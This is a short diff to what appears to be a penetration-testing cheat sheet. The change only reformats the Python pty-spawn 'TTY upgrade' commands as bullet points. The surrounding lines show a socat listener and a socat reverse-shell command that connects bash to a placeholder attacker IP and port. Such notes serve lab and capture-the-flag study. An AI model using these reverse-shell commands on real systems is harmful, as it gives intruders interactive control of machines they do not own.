@@ -21,5 +21,5 @@ sudo socat file:`tty`,raw,echo=0 tcp-listen:<Port>
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP Address>:<Port>
 # TTY Upgrades
 ## PYTHON
-python -c 'import pty;pty.spawn("/bin/bash")'
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+ * python -c 'import pty;pty.spawn("/bin/bash")'
+ * python3 -c 'import pty;pty.spawn("/bin/bash")'
